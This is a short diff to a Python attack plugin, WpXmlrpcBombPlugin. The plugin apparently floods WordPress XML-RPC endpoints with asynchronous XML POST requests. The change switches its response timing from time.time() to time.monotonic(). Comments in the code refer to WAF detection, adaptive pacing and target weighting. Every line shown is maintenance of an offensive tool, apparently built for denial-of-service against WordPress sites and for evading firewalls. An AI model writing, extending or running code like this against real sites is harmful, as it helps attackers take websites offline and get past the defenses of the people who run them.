@@ -196,13 +196,13 @@ class WpXmlrpcBombPlugin(AttackPlugin):
                 headers = self._get_fresh_headers(context, "document")
                 headers["Content-Type"] = "text/xml"
 
-                t = time.time()
+                t = time.monotonic()
                 try:
                     async with context.session.post(
                         url, headers=headers, data=xml_body,
                         ssl=_ssl, allow_redirects=False,
                     ) as resp:
-                        rt = time.time() - t
+                        rt = time.monotonic() - t
                         # BUG-FIX v34: Use _process_response for WAF detection,
                         # adaptive pacing, and target weighting
                         resp_headers = dict(resp.headers)
@@ -223,7 +223,7 @@ class WpXmlrpcBombPlugin(AttackPlugin):
                 except asyncio.CancelledError:
                     raise
                 except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
-                    rt = time.time() - t
+                    rt = time.monotonic() - t
                     self._on_request_result(worker_id, False)
                     await self._record(
                         "WP-XMLRPC", False, 0, rt,
